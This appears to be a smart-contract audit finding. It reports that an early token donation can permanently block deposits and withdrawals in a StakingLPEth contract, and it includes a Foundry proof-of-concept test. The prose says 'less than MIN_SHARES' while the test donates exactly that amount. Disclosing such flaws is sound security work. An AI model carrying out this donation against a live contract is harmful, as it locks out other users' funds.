# Vulnerability details

## Impact

Permanent DoS of deposit and withdraw functionality.

## Proof of Concept

* `StakingLPEth` contract enforces use of atleast `MIN_SHARES` during deposits and withdrawal to protect users from Infamous Inflation Attack.

```solidity

    /// @notice Minimum non-zero shares amount to prevent donation attack
    uint256 private constant MIN_SHARES = 0.01 ether;

```

* But there is an issue with the way `_checkMinShares` works.

```solidity

    function _checkMinShares() internal view {
        uint256 _totalSupply = totalSupply();
        if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation();
    }

```

* If a malicious user donate shares worth less than `MIN_SHARES` right after deployment, the function `_checkMinShares` will always revert leading to DoS.

**Here is a Quick Test:**

* Add the following `testDoSUsingDonation` function in `StakingLP.t.sol` test.

```solidity

    function testDoSUsingDonation() public {
        // 1. User1 who is malicious donates 0.01 ether
        vm.startPrank(user1);
        liquidityPool.transfer(address(stakingLpEth), 0.01 ether);        
        vm.stopPrank();

        // 2. User2 approves and tries to deposit.
        vm.startPrank(user2);
        liquidityPool.approve(address(stakingLpEth), 0.1 ether);

        // 3. Deposit Reverts.
        vm.expectRevert();
        stakingLpEth.deposit(0.1 ether, user1);
        vm.stopPrank();
    }

```
